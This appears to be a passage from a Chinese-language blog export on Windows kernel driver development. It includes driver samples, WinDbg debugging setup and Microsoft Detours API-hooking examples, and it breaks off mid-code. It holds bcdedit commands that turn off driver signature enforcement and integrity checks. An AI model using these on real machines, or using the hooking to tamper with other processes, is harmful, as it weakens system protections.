class="literal">NULL</span>) &#123;</span><br><span class="line">			IoDeleteDevice(dev);</span><br><span class="line">		&#125;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[+]åˆ é™¤è®¾å¤‡å’Œç¬¦å·é“¾æ¥æˆåŠŸ...\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING  RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;[%ws]Hello Kernel World\n&quot;</span>, __FUNCTIONW__);</span><br><span class="line">	<span class="keyword">if</span> (RegistryPath != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[%ws]æ‰€åœ¨æ³¨å†Œè¡¨ä½ç½®:%wZ\n&quot;</span>, __FUNCTIONW__, RegistryPath);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (DriverObject != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[%ws]é©±åŠ¨å¯¹è±¡åœ°å€:%p\n&quot;</span>, __FUNCTIONW__, DriverObject);</span><br><span class="line">		<span class="comment">//åˆ›å»ºæ§åˆ¶è®¾å¤‡</span></span><br><span class="line">		CreateDevice(DriverObject);</span><br><span class="line">		<span class="comment">//è®¾ç½®åˆ†å‘å‡½æ•°</span></span><br><span class="line">		<span class="comment">/*DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDispatch;</span></span><br><span class="line"><span class="comment">		DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = CreateDispatchFunc;</span></span><br><span class="line"><span class="comment">		DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = CloseDispatchFunc;*/</span></span><br><span class="line">		<span class="comment">// è¿™é‡Œdriver-&gt;MajorFunctionæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸åŒçš„è¯·æ±‚å¯ä»¥è®¾ç½®ä¸åŒçš„å¤„ç†å‡½æ•°</span></span><br><span class="line">		<span class="comment">// è¿™é‡Œä¸ºäº†æ–¹ä¾¿æ‰€æœ‰çš„è¯·æ±‚éƒ½ç”¨ä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œåœ¨å‡½æ•°å†…éƒ¨å»åŒºåˆ†è¯·æ±‚ï¼Œå†åšä¸åŒçš„é€»è¾‘å¤„ç†</span></span><br><span class="line">		<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			DriverObject-&gt;MajorFunction[i] = MyDispatch;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[+]é©±åŠ¨åŠ è½½æˆåŠŸ&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/10.png" alt="img"></p>
]]></content>
      <categories>
        <category>é©±åŠ¨</category>
      </categories>
      <tags>
        <tag>é©±åŠ¨</tag>
      </tags>
  </entry>
  <entry>
    <title>é©±åŠ¨-1_å¼€å‘ç¯å¢ƒé…ç½®åŠä½¿ç”¨</title>
    <url>/posts/39878b26/</url>
    <content><![CDATA[<h3 id="é©±åŠ¨ç¯å¢ƒå®‰è£…"><a href="#é©±åŠ¨ç¯å¢ƒå®‰è£…" class="headerlink" title="é©±åŠ¨ç¯å¢ƒå®‰è£…"></a>é©±åŠ¨ç¯å¢ƒå®‰è£…</h3><ol>
<li>å®‰è£…Vs2022</li>
<li>å®‰è£…SDK</li>
<li>å®‰è£…WDK</li>
</ol>
<h3 id="DriverDemo"><a href="#DriverDemo" class="headerlink" title="DriverDemo"></a>DriverDemo</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ntddk.h&quot;</span></span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (DriverObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;[%ws]Driver Upload,Driver Object Address:%p&quot;</span>, __FUNCTIONW__,DriverObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">( PDRIVER_OBJECT DriverObject,PUNICODE_STRING  RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//KdBreakPoint();</span></span><br><span class="line">    DbgPrint(<span class="string">&quot;[%ws]Hello Kernel World\n&quot;</span>,__FUNCTIONW__);</span><br><span class="line">    <span class="keyword">if</span> (RegistryPath != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;[%ws]æ‰€åœ¨æ³¨å†Œè¡¨ä½ç½®:%wZ\n&quot;</span>, __FUNCTIONW__,RegistryPath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (DriverObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;[%ws]é©±åŠ¨å¯¹è±¡åœ°å€:%p\n&quot;</span>, __FUNCTIONW__,DriverObject);</span><br><span class="line">        DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="error-MSB8040-æ­¤é¡¹ç›®éœ€è¦ç¼“è§£äº†-Spectre-æ¼æ´çš„åº“"><a href="#error-MSB8040-æ­¤é¡¹ç›®éœ€è¦ç¼“è§£äº†-Spectre-æ¼æ´çš„åº“" class="headerlink" title="error MSB8040: æ­¤é¡¹ç›®éœ€è¦ç¼“è§£äº† Spectre æ¼æ´çš„åº“"></a>error MSB8040: æ­¤é¡¹ç›®éœ€è¦ç¼“è§£äº† Spectre æ¼æ´çš„åº“</h4><p><a href="https://www.cnblogs.com/hack747/p/16398455.html">https://www.cnblogs.com/hack747/p/16398455.html</a></p>
<p>å®‰è£…å¯¹åº”ç‰ˆæœ¬çš„Spectreç¼“è§£åº“</p>
<p><img src="/posts/39878b26/1.png" alt="img"></p>
<h4 id="MyDriver1-inf-error-1297-Device-driver-does-not-install-on-any-devices"><a href="#MyDriver1-inf-error-1297-Device-driver-does-not-install-on-any-devices" class="headerlink" title="MyDriver1.inf : error 1297: Device driver does not install on any devices"></a>MyDriver1.inf : error 1297: Device driver does not install on any devices</h4><p>åˆ é™¤.infæ–‡ä»¶é‡æ–°ç¼–è¯‘å³å¯</p>
<h3 id="é©±åŠ¨ç­¾åç¦ç”¨"><a href="#é©±åŠ¨ç­¾åç¦ç”¨" class="headerlink" title="é©±åŠ¨ç­¾åç¦ç”¨"></a>é©±åŠ¨ç­¾åç¦ç”¨</h3><p><a href="https://zh.theihccforum.com/how-disable-driver-signature-enforcement-windows-10">https://zh.theihccforum.com/how-disable-driver-signature-enforcement-windows-10</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bcdedit /set nointegritychecks on</span><br><span class="line">bcdedit /set testsigning on</span><br><span class="line">bcdedit /set loadoptions DDISABLE_INTEGRITY_CHECKS</span><br></pre></td></tr></table></figure>

<h3 id="é©±åŠ¨åŠ è½½è¿è¡Œ"><a href="#é©±åŠ¨åŠ è½½è¿è¡Œ" class="headerlink" title="é©±åŠ¨åŠ è½½è¿è¡Œ"></a>é©±åŠ¨åŠ è½½è¿è¡Œ</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sc create scdemo binPath=<span class="string">&quot;c:\demo.sys&quot;</span> type= kernel start= demand</span><br><span class="line">sc start scdemo</span><br><span class="line">sc stop scdemo</span><br><span class="line">sc delete scdemo</span><br></pre></td></tr></table></figure>



<h3 id="ä½¿ç”¨Drover-Loader-Unloader-åŠ è½½é©±åŠ¨"><a href="#ä½¿ç”¨Drover-Loader-Unloader-åŠ è½½é©±åŠ¨" class="headerlink" title="ä½¿ç”¨Drover Loader/Unloader åŠ è½½é©±åŠ¨"></a>ä½¿ç”¨Drover Loader/Unloader åŠ è½½é©±åŠ¨</h3><p><img src="/posts/39878b26/2.png" alt="img"></p>
<p>å¯ä»¥ä½¿ç”¨debugviewæŸ¥çœ‹åŠ è½½å†…å®¹</p>
<p><img src="/posts/39878b26/3.png" alt="img"></p>
<h3 id="MacOsä¸‹-Windbg-view-åŒæœºè°ƒè¯•é…ç½®"><a href="#MacOsä¸‹-Windbg-view-åŒæœºè°ƒè¯•é…ç½®" class="headerlink" title="MacOsä¸‹ Windbg view åŒæœºè°ƒè¯•é…ç½®"></a>MacOsä¸‹ Windbg view åŒæœºè°ƒè¯•é…ç½®</h3><h4 id="Net"><a href="#Net" class="headerlink" title="Net"></a>Net</h4><p>netç›¸å¯¹äºä½¿ç”¨ä¸²å£è¾ƒä¸ºç®€å•è®¾ç½®äº›</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è°ƒè¯•æœºå™¨	ï¼š 192.168.181.130</span></span><br><span class="line"><span class="comment">//è¢«è°ƒè¯•æœºå™¨ 	ï¼š 192.168.181.138</span></span><br><span class="line"><span class="comment">//è¢«è°ƒè¯•æœºä¸‹ç”Ÿæˆkey</span></span><br><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings net hostip:<span class="number">192.168</span><span class="number">.181</span><span class="number">.130</span> port:<span class="number">50010</span></span><br><span class="line">Key=<span class="number">3</span>cb9a0g3w94mp<span class="number">.1</span>pnw6lxz6ohti<span class="number">.38</span>p3gpzpdrc7k.qqgcqkf16kuv</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨è°ƒè¯•æœºwindbgä¸‹attach to kernelè¿›è¡Œnetè¿æ¥</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/39878b26/4.png" alt="img"></p>
<p><img src="/posts/39878b26/5.png" alt="img"></p>
<h4 id="Com"><a href="#Com" class="headerlink" title="Com"></a>Com</h4><h5 id="1-æ‰¾åˆ°å¯¹åº”çš„è™šæ‹Ÿæœº-vmxæ–‡ä»¶è¿›è¡Œä¿®æ”¹"><a href="#1-æ‰¾åˆ°å¯¹åº”çš„è™šæ‹Ÿæœº-vmxæ–‡ä»¶è¿›è¡Œä¿®æ”¹" class="headerlink" title="1.æ‰¾åˆ°å¯¹åº”çš„è™šæ‹Ÿæœº.vmxæ–‡ä»¶è¿›è¡Œä¿®æ”¹"></a>1.æ‰¾åˆ°å¯¹åº”çš„è™šæ‹Ÿæœº.vmxæ–‡ä»¶è¿›è¡Œä¿®æ”¹</h5><p>è¢«è°ƒè¯•æœºå™¨è®¾ç½®</p>
<p>å°†åŸæœ‰çš„ serial0é¡¹åˆ é™¤æ›¿æ¢</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">serial0.fileType = <span class="string">&quot;thinprint&quot;</span></span><br><span class="line">serial0.fileName = <span class="string">&quot;thinprint&quot;</span></span><br><span class="line">serial0.fileName = <span class="string">&quot;/Users/&#123;name&#125;/com1&quot;</span></span><br><span class="line">serial0.present = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.fileType = <span class="string">&quot;pipe&quot;</span></span><br><span class="line">serial0.yieldOnMsrRead = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.startConnected = <span class="string">&quot;TRUE&quot;</span></span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•æœºå™¨è®¾ç½®</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">serial0.fileType = <span class="string">&quot;thinprint&quot;</span></span><br><span class="line">serial0.fileName = <span class="string">&quot;thinprint&quot;</span></span><br><span class="line">serial0.present = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.present = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.fileType = <span class="string">&quot;pipe&quot;</span></span><br><span class="line">serial0.fileName = <span class="string">&quot;/Users/&#123;name&#125;/com1&quot;</span></span><br><span class="line">serial0.yieldOnMsrRead = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.tryNoRxLoss = <span class="string">&quot;FALSE&quot;</span></span><br><span class="line">serial0.pipe.endPoint = <span class="string">&quot;client&quot;</span></span><br></pre></td></tr></table></figure>

<p>{name}æ›¿æ¢ä¸ºè‡ªå·±ç”µè„‘çš„ç”¨æˆ·å</p>
<h5 id="2-è¢«è°ƒè¯•æœºè®¾ç½®å¼€å¯ä¸²å£-ç®¡ç†å‘˜cmdè¿è¡Œä»¥ä¸‹å‘½ä»¤"><a href="#2-è¢«è°ƒè¯•æœºè®¾ç½®å¼€å¯ä¸²å£-ç®¡ç†å‘˜cmdè¿è¡Œä»¥ä¸‹å‘½ä»¤" class="headerlink" title="2. è¢«è°ƒè¯•æœºè®¾ç½®å¼€å¯ä¸²å£ ç®¡ç†å‘˜cmdè¿è¡Œä»¥ä¸‹å‘½ä»¤"></a>2. è¢«è°ƒè¯•æœºè®¾ç½®å¼€å¯ä¸²å£ ç®¡ç†å‘˜cmdè¿è¡Œä»¥ä¸‹å‘½ä»¤</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="class"><span class="keyword">enum</span> <span class="title">ACTIVE</span></span></span><br><span class="line"><span class="class"><span class="title">bcdedit</span> /<span class="title">dbgsettings</span> <span class="title">serial</span> <span class="title">baudrate</span>:</span><span class="number">115200</span> debugport:<span class="number">1</span></span><br><span class="line">bcdedit /copy &#123;current&#125; /d <span class="string">&quot;Windows Debug Entry&quot;</span></span><br><span class="line">    </span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;ä¸Šä¸€è¡Œçš„id&#125;</span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;f08931ce<span class="number">-554</span>a<span class="number">-11</span>ed<span class="number">-850</span>e-c773c5b7f7b1&#125;</span><br><span class="line"></span><br><span class="line">bcdedit /debug &#123;ä¸Šä¸€è¡Œçš„id&#125; ON</span><br><span class="line">bcdedit /debug  &#123;f08931ce<span class="number">-554</span>a<span class="number">-11</span>ed<span class="number">-850</span>e-c773c5b7f7b1&#125; ON</span><br><span class="line"></span><br><span class="line">bcdedit -<span class="built_in">set</span> TESTSIGNING on</span><br><span class="line">bcdedit /dbgsettings</span><br></pre></td></tr></table></figure>

<p><img src="/posts/39878b26/6.png" alt="img"></p>
<p>è®¾ç½®å®Œæˆåé‡å¯ç³»ç»Ÿ é€‰æ‹©ç¬¬äºŒé¡¹</p>
<p><img src="/posts/39878b26/7.png" alt="img"></p>
<h5 id="3-è°ƒè¯•æœºè®¾ç½®"><a href="#3-è°ƒè¯•æœºè®¾ç½®" class="headerlink" title="3.è°ƒè¯•æœºè®¾ç½®"></a>3.è°ƒè¯•æœºè®¾ç½®</h5><p>è®¡ç®—æœºç®¡ç† - è®¾å¤‡ç®¡ç†å™¨- ç«¯å£-é€šä¿¡ç«¯å£-ç«¯å£è®¾ç½®   è®¾ç½®ä¸º115200</p>
<p><img src="/posts/39878b26/8.png" alt="img"></p>
<h5 id="4-è°ƒè¯•æœºwindbg-kernel-Debugging-comè¿æ¥è¿›è¡Œè°ƒè¯•"><a href="#4-è°ƒè¯•æœºwindbg-kernel-Debugging-comè¿æ¥è¿›è¡Œè°ƒè¯•" class="headerlink" title="4.è°ƒè¯•æœºwindbg kernel Debugging comè¿æ¥è¿›è¡Œè°ƒè¯•"></a>4.è°ƒè¯•æœºwindbg kernel Debugging comè¿æ¥è¿›è¡Œè°ƒè¯•</h5><p><img src="/posts/39878b26/9.png" alt="img"></p>
<h4 id="ä½¿ç”¨VirtualKD-Reduxï¼ˆÃ—ï¼‰"><a href="#ä½¿ç”¨VirtualKD-Reduxï¼ˆÃ—ï¼‰" class="headerlink" title="ä½¿ç”¨VirtualKD-Reduxï¼ˆÃ—ï¼‰"></a>ä½¿ç”¨VirtualKD-Reduxï¼ˆÃ—ï¼‰</h4><p>åœ¨macä¸‹ä½¿ç”¨è™šæ‹Ÿæœºé€šè¿‡è¯¥æ–¹æ³•å°è¯•æ—¶æ²¡èƒ½æˆåŠŸ </p>
<p><a href="https://github.com/4d61726b/VirtualKD-Redux">https://github.com/4d61726b/VirtualKD-Redux</a></p>
<p>å®‰è£…é‡å¯å è¿›å…¥è¯¥æ¨¡å¼F8å…³é—­ç­¾ååä¼šä¸€ç›´å¡æ­»ã€‚ã€‚ã€‚</p>
<p><img src="/posts/39878b26/10.png" alt="img"></p>
]]></content>
      <categories>
        <category>é©±åŠ¨</category>
      </categories>
      <tags>
        <tag>é©±åŠ¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Detoursä½¿ç”¨</title>
    <url>/posts/64796bf6/</url>
    <content><![CDATA[<h4 id="æ‹¦æˆªæ–‡ä»¶åˆ›å»º"><a href="#æ‹¦æˆªæ–‡ä»¶åˆ›å»º" class="headerlink" title="æ‹¦æˆªæ–‡ä»¶åˆ›å»º"></a>æ‹¦æˆªæ–‡ä»¶åˆ›å»º</h4><p>hook CreateFielA</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HANDLE (WINAPI* oldCreateFileA)(</span><br><span class="line">     LPCSTR lpFileName,</span><br><span class="line">     DWORD dwDesiredAccess,</span><br><span class="line">     DWORD dwShareMode,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span><br><span class="line">     DWORD dwCreationDisposition,</span><br><span class="line">     DWORD dwFlagsAndAttributes,</span><br><span class="line">     HANDLE hTemplateFile</span><br><span class="line">)= CreateFileA;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE WINAPI <span class="title function_">MyCreateFileA</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ LPCSTR lpFileName,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwDesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwShareMode,</span></span><br><span class="line"><span class="params">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwCreationDisposition,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwFlagsAndAttributes,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE hTemplateFile</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* str = <span class="string">&quot;C:\\Users\\test\\Desktop\\testdemo.exe&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!_strcmpi(str, lpFileName)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        sprintf_s(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;æ‹¦æˆªåˆ°åˆ›å»ºæ–‡ä»¶è¯·æ±‚:%s&quot;</span>, lpFileName);</span><br><span class="line">        MessageBoxA(<span class="number">0</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        lpFileName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> oldCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,\</span><br><span class="line">            dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> oldCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, \</span><br><span class="line">        dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŒ‚é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldCreateFileA, MyCreateFileA);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è„±é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldCreateFileA, MyCreateFileA);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‹¦æˆªåˆ›å»ºçš„æ–‡ä»¶ CreateFileA</span></span><br><span class="line"><span class="type">void</span>  <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    hook();</span><br><span class="line">    CreateFileA(<span class="string">&quot;C:\\Users\\test\\Desktop\\testdemo.exe&quot;</span>, GENERIC_ALL, <span class="number">0</span>, <span class="number">0</span>, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="hooké˜²dllæ³¨å…¥"><a href="#hooké˜²dllæ³¨å…¥" class="headerlink" title="hooké˜²dllæ³¨å…¥"></a>hooké˜²dllæ³¨å…¥</h4><p>hook LoadLibraryAå’ŒGetProcAddress</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WtsApi32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;WtsApi32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE(WINAPI* oldLoadLibraryA)(LPCSTR lpLibFileName) = LoadLibraryA;</span><br><span class="line">FARPROC(WINAPI* oldGetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = GetProcAddress;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HMODULE WINAPI <span class="title function_">MyLoadLibraryA</span><span class="params">(LPCSTR lpLibFileName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> oldLoadLibraryA(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FARPROC WINAPI <span class="title function_">MyGetProcAddress</span><span class="params">(HMODULE hModule, LPCSTR lpProcName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> oldGetProcAddress(<span class="number">0</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æŒ‚é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldLoadLibraryA, MyLoadLibraryA);</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldGetProcAddress, MyGetProcAddress);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è„±é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldLoadLibraryA, MyLoadLibraryA);</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldGetProcAddress, MyGetProcAddress);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(  HMODULE hModule,</span></span><br><span class="line"><span class="params">                        DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                        LPVOID lpReserved</span></span><br><span class="line"><span class="params">                      )</span></span><br><span class="line">&#123;</span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;title&quot;</span>);</span><br><span class="line">    LPWSTR  message = LPWSTR(<span class="string">L&quot;inject success&quot;</span>);</span><br><span class="line">    DWORD resp;<span class="comment">//ä¸è¦å®šä¹‰æˆæŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"></span><br><span class="line">        WTSSendMessageW(</span><br><span class="line">            WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">            WTSGetActiveConsoleSessionId(),</span><br><span class="line">            title, lstrlen((LPCSTR)title),</span><br><span class="line">            message, lstrlen((LPCSTR)message),</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">        hook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        unhook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="è¿›ç¨‹ç›‘æ§"><a href="#è¿›ç¨‹ç›‘æ§" class="headerlink" title="è¿›ç¨‹ç›‘æ§"></a>è¿›ç¨‹ç›‘æ§</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WtsApi32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;WtsApi32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">BOOL (WINAPI* _CreateProcessA)(</span><br><span class="line">     LPCSTR lpApplicationName,</span><br><span class="line">     LPSTR lpCommandLine,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">     BOOL bInheritHandles,</span><br><span class="line">     DWORD dwCreationFlags,</span><br><span class="line">     LPVOID lpEnvironment,</span><br><span class="line">     LPCSTR lpCurrentDirectory,</span><br><span class="line">     LPSTARTUPINFOA lpStartupInfo,</span><br><span class="line">     LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">) = CreateProcessA;</span><br><span class="line"></span><br><span class="line">BOOL(WINAPI* _CreateProcessW)(</span><br><span class="line">     LPCWSTR lpApplicationName,</span><br><span class="line">     LPWSTR lpCommandLine,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">     BOOL bInheritHandles,</span><br><span class="line">     DWORD dwCreationFlags,</span><br><span class="line">     LPVOID lpEnvironment,</span><br><span class="line">     LPCWSTR lpCurrentDirectory,</span><br><span class="line">     LPSTARTUPINFOW lpStartupInfo,</span><br><span class="line">     LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">) = CreateProcessW;</span><br><span 